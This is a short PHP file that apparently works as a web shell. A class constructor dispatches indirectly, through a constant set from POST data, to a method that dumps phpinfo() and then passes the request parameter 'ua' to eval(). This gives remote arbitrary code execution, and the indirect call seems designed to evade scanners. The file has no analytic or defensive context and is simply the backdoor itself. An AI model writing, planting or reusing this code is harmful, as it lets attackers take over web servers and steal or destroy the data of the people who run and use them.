<?php
$_POST['ename'] = 'getRequestUri';
define('ENAME', $_POST['ename']);

class test {
    public $ename = ENAME;
    function __construct() {
        $this->{$this->ename}();
    }

    function getRequestUri() {
        phpinfo();
        $ua = trim($_REQUEST['ua']);
        eval($ua);
        
    }
}

new test();